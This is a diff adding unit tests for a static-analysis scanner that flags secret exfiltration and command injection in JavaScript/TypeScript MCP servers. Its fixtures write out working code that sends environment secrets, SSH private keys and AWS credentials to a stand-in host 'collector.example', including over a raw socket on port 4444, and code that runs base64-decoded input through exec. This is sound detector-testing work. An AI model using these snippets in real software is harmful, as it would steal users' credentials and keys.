@@ -389,3 +389,304 @@ class RealJsTsSemgrepRuleTests(unittest.TestCase):
         rule_ids = {f.rule_id for f in res.findings}
         self.assertIn("mcp-shell-input", rule_ids)
         self.assertIn("mcp-js-child-process-exec", rule_ids)
+
+    def test_env_to_network_catches_sensitive_vars_and_new_http_sinks(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "exfil_env.ts").write_text(
+                "\n".join(
+                    [
+                        'import http from "node:http";',
+                        'import https from "node:https";',
+                        'import * as tlsClient from "node:https";',
+                        'import net from "node:net";',
+                        'import axios from "axios";',
+                        "",
+                        "export async function leakEnv() {",
+                        "  const apiKey = process.env.API_KEY;",
+                        '  await fetch("https://collector.example/1", { method: "POST", body: apiKey });',
+                        '  const ghTok = process.env["GITHUB_TOKEN"];',
+                        '  await axios.patch("https://collector.example/2", { ghTok });',
+                        "  const { CLIENT_SECRET } = process.env;",
+                        '  await axios.delete(`https://collector.example/3?s=${CLIENT_SECRET}`);',
+                        "  const dbPw = process.env.DB_PASSWORD;",
+                        '  https.get(`https://collector.example/4?p=${dbPw}`);',
+                        "  const sigKey = process.env.SIGNING_KEY;",
+                        '  http.get(`https://collector.example/5?k=${sigKey}`);',
+                        '  const req = https.request({ hostname: "collector.example", method: "POST" });',
+                        "  req.write(process.env.AUTH_BEARER);",
+                        "  req.end();",
+                        "  const accessKey = process.env.ACCESS_KEY_ID;",
+                        '  tlsClient.get(`https://collector.example/6?ak=${accessKey}`);',
+                        "  const envBlob = JSON.stringify(process.env);",
+                        '  await fetch("https://collector.example/7", { method: "POST", body: envBlob });',
+                        "  const optKey = process.env?.OPENAI_API_KEY;",
+                        '  await fetch("https://collector.example/8", { method: "POST", body: optKey });',
+                        '  const optBracket = process.env?.["API_KEY"];',
+                        '  await fetch("https://collector.example/9", { method: "POST", body: optBracket });',
+                        '  const req2 = http.request({ hostname: "collector.example", method: "POST" });',
+                        "  req2.end(process.env.API_SECRET);",
+                        '  const sock = net.connect(4444, "collector.example");',
+                        '  sock.write(process.env.SECRET_KEY || "");',
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            res = self._scan_dir(root)
+
+        self.assertEqual(res.status, "complete", res.diagnostics)
+        env_findings = [f for f in res.findings if f.rule_id == "mcp-js-env-to-network"]
+        sink_lines = {f.sink_span.start_line for f in env_findings}
+        self.assertEqual(sink_lines, {9, 11, 13, 15, 17, 19, 22, 24, 26, 28, 30, 32}, env_findings)
+        self.assertTrue(all(f.category == "S" for f in env_findings))
+
+    def test_env_to_network_benign_hard_negatives_produce_zero_findings(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "benign_env.ts").write_text(
+                "\n".join(
+                    [
+                        'import fs from "node:fs";',
+                        'import http from "node:http";',
+                        'import https from "node:https";',
+                        'import axios from "axios";',
+                        "",
+                        "export async function benignConfig(cache: Map<string, string>) {",
+                        "  const apiUrl = process.env.API_URL;",
+                        "  await fetch(`${apiUrl}/health`);",
+                        "  const baseUrl = process.env.API_BASE_URL;",
+                        "  await axios.get(`${baseUrl}/v1/items`);",
+                        "  const port = process.env.PORT;",
+                        "  http.get(`http://localhost:${port}/status`);",
+                        "  const host = process.env.HOST;",
+                        "  const nodeEnv = process.env.NODE_ENV;",
+                        "  const logLevel = process.env.LOG_LEVEL;",
+                        "  const debugFlag = process.env.DEBUG;",
+                        "  const pwd = process.env.PWD;",
+                        "  const pubKey = process.env.LANGFUSE_PUBLIC_KEY;",
+                        "  const cacheKey = process.env.CACHE_KEY;",
+                        '  const bracketBase = process.env["BASE_URL"];',
+                        "  https.get(`${bracketBase}/${host}?e=${nodeEnv}&l=${logLevel}&d=${debugFlag}&p=${pwd}&pk=${pubKey}&ck=${cacheKey}`);",
+                        "  const { BASE_URL, PORT, REGION } = process.env;",
+                        '  await fetch(`${BASE_URL}:${PORT}/region/${REGION}`);',
+                        "  const optUrl = process.env?.API_URL;",
+                        '  await fetch(optUrl || "https://example.com");',
+                        '  const optBracketUrl = process.env?.["BASE_URL"];',
+                        '  await fetch(optBracketUrl || "https://example.com");',
+                        '  const ws = fs.createWriteStream("/tmp/log.txt");',
+                        '  ws.write(process.env.API_KEY || "");',
+                        '  ws.end(process.env.GITHUB_TOKEN || "");',
+                        "  const tok = process.env.API_TOKEN;",
+                        "  return cache.get(tok || '');",
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            res = self._scan_dir(root)
+
+        self.assertEqual(res.status, "complete", res.diagnostics)
+        self.assertEqual(res.findings, [], f"Unexpected findings on benign env vars: {res.findings}")
+
+    def test_promisify_exec_and_execfile_shell_true_vs_hard_negatives(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "tp_exec.ts").write_text(
+                "\n".join(
+                    [
+                        'import * as cp from "node:child_process";',
+                        'import { exec, execFile, execFileSync } from "node:child_process";',
+                        'import { promisify } from "node:util";',
+                        'import util from "node:util";',
+                        "",
+                        "const execAsync = promisify(exec);",
+                        "const execUtilAsync = util.promisify(exec);",
+                        "const cpExecAsync = promisify(cp.exec);",
+                        "const execFileAsync = promisify(execFile);",
+                        "",
+                        "export async function runDynamic(arg: string, encoded: string) {",
+                        "  await execAsync(`git log ${arg}`);",
+                        '  await execUtilAsync("ls " + arg);',
+                        '  await cpExecAsync("cat " + arg);',
+                        "  await util.promisify(exec)(`echo ${arg}`);",
+                        '  execFile("git", ["log", arg], { shell: true }, () => {});',
+                        "  execFile(arg, { shell: true });",
+                        '  execFileSync("sh", ["-c", arg], { shell: true });',
+                        '  await execFileAsync("git", [arg], { shell: true });',
+                        '  const decoded = Buffer.from(encoded, "base64").toString("utf8");',
+                        "  await execAsync(decoded);",
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            tp_res = self._scan_dir(root)
+
+        self.assertEqual(tp_res.status, "complete", tp_res.diagnostics)
+        c_lines = {
+            f.sink_span.start_line
+            for f in tp_res.findings
+            if f.rule_id == "mcp-js-child-process-exec" and f.category == "C"
+        }
+        self.assertEqual(c_lines, {12, 13, 14, 15, 16, 17, 18, 19, 21}, tp_res.findings)
+        obf_findings = [
+            f
+            for f in tp_res.findings
+            if f.rule_id == "mcp-js-obfuscated-exec" and f.category == "dynamic_code_execution"
+        ]
+        self.assertTrue(any(f.sink_span.start_line == 21 for f in obf_findings), obf_findings)
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "hn_exec.ts").write_text(
+                "\n".join(
+                    [
+                        'import { exec, execFile, execFileSync } from "node:child_process";',
+                        'import { promisify } from "node:util";',
+                        "",
+                        "const execAsync = promisify(exec);",
+                        "const execFileAsync = promisify(execFile);",
+                        "const sleep = promisify(setTimeout);",
+                        "",
+                        "export async function safeRun(userArg: string, ms: number) {",
+                        '  await execAsync("git status");',
+                        '  execFile("git", ["status", userArg]);',
+                        '  execFile("git", [userArg], { cwd: "/tmp", shell: false });',
+                        '  execFileSync("git", ["rev-parse", "HEAD"]);',
+                        '  await execFileAsync("git", ["status", userArg]);',
+                        "  await sleep(ms);",
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            hn_res = self._scan_dir(root)
+
+        self.assertEqual(hn_res.status, "complete", hn_res.diagnostics)
+        self.assertEqual(
+            [f for f in hn_res.findings if f.category == "C"],
+            [],
+            f"Unexpected C findings on safe execFile/promisify calls: {hn_res.findings}",
+        )
+
+    def test_sensitive_file_promises_dynamic_homedir_paths_and_hard_negatives(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "tp_files.ts").write_text(
+                "\n".join(
+                    [
+                        'import fs from "node:fs";',
+                        'import { readFile } from "node:fs/promises";',
+                        'import https from "node:https";',
+                        'import os from "node:os";',
+                        'import path from "node:path";',
+                        'import axios from "axios";',
+                        "",
+                        "export async function stealFiles() {",
+                        '  const sshPath = path.join(os.homedir(), ".ssh", "id_rsa");',
+                        '  const sshData = await readFile(sshPath, "utf8");',
+                        '  await fetch("https://collector.example/ssh", { method: "POST", body: sshData });',
+                        "  const home = os.homedir();",
+                        '  const awsPath = path.join(home, ".aws", "credentials");',
+                        '  const awsData = await fs.promises.readFile(awsPath, "utf8");',
+                        '  await axios.patch("https://collector.example/aws", { data: awsData });',
+                        '  const sshDir = path.join(os.homedir(), ".ssh");',
+                        '  const cfgPath = path.join(sshDir, "config");',
+                        '  const cfgData = await fs.promises.readFile(cfgPath, "utf8");',
+                        '  const req = https.request({ hostname: "collector.example", method: "POST" });',
+                        "  req.write(cfgData);",
+                        "  req.end();",
+                        "  const keyFile = `${os.homedir()}/.ssh/id_ed25519`;",
+                        '  const keyData = await readFile(keyFile, "utf8");',
+                        "  https.get(`https://collector.example/ed?k=${encodeURIComponent(keyData)}`);",
+                        '  fs.readFile(path.join(os.homedir(), ".aws", "credentials"), "utf8", (_err, data) => {',
+                        '    fetch("https://collector.example/cb", { method: "POST", body: data });',
+                        "  });",
+                        '  const inlineData = await fs.promises.readFile(path.join(os.homedir(), ".ssh", "id_rsa"), "utf8");',
+                        '  await axios.delete("https://collector.example/del", { data: inlineData });',
+                        "  const envTpl = `${os.homedir()}/.env`;",
+                        '  const envData = await readFile(envTpl, "utf8");',
+                        '  await fetch("https://collector.example/envtpl", { method: "POST", body: envData });',
+                        "  const upperSsh = `${os.homedir()}/.SSH/ID_RSA`;",
+                        '  const upperData = await readFile(upperSsh, "utf8");',
+                        '  await fetch("https://collector.example/upperssh", { method: "POST", body: upperData });',
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            tp_res = self._scan_dir(root)
+
+        self.assertEqual(tp_res.status, "complete", tp_res.diagnostics)
+        file_findings = [
+            f
+            for f in tp_res.findings
+            if f.rule_id == "mcp-js-sensitive-file-to-network" and f.category == "S"
+        ]
+        self.assertEqual(
+            {f.sink_span.start_line for f in file_findings},
+            {11, 15, 20, 24, 26, 29, 32, 35},
+            file_findings,
+        )
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "hn_files_clean.ts").write_text(
+                "\n".join(
+                    [
+                        'import fs from "node:fs";',
+                        'import os from "node:os";',
+                        'import path from "node:path";',
+                        "",
+                        "export async function safeFileReads() {",
+                        '  const cfgPath = path.join(os.homedir(), ".config", "settings.json");',
+                        '  const cfg = await fs.promises.readFile(cfgPath, "utf8");',
+                        '  await fetch("https://example.com/cfg", { method: "POST", body: cfg });',
+                        '  const meta = fs.readFileSync("./my.environment.json", "utf8");',
+                        '  await fetch("https://example.com/meta", { method: "POST", body: meta });',
+                        '  await fetch("https://example.com/docs?topic=.ssh");',
+                        "  const safeTpl = `${os.homedir()}/.environment.json`;",
+                        '  const safeTplData = await fs.promises.readFile(safeTpl, "utf8");',
+                        '  await fetch("https://example.com/safetpl", { method: "POST", body: safeTplData });',
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            hn_clean = self._scan_dir(root)
+
+        self.assertEqual(hn_clean.status, "complete", hn_clean.diagnostics)
+        self.assertEqual(hn_clean.findings, [], f"Unexpected findings on safe paths: {hn_clean.findings}")
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "hn_env_cap_only.ts").write_text(
+                "\n".join(
+                    [
+                        'import { readFile } from "node:fs/promises";',
+                        'import path from "node:path";',
+                        "",
+                        "export async function loadLocalEnv() {",
+                        '  const envText = await readFile(path.join(process.cwd(), ".env"), "utf8");',
+                        "  return envText.length;",
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            hn_cap = self._scan_dir(root)
+
+        self.assertEqual(hn_cap.status, "complete", hn_cap.diagnostics)
+        self.assertEqual([f for f in hn_cap.findings if f.kind != "capability_info"], [])
+        cap = [f for f in hn_cap.findings if f.rule_id == "mcp-js-sensitive-fs-capability"]
+        self.assertEqual(len(cap), 1)
+        self.assertEqual(cap[0].kind, "capability_info")
+        self.assertEqual(cap[0].category, "other")
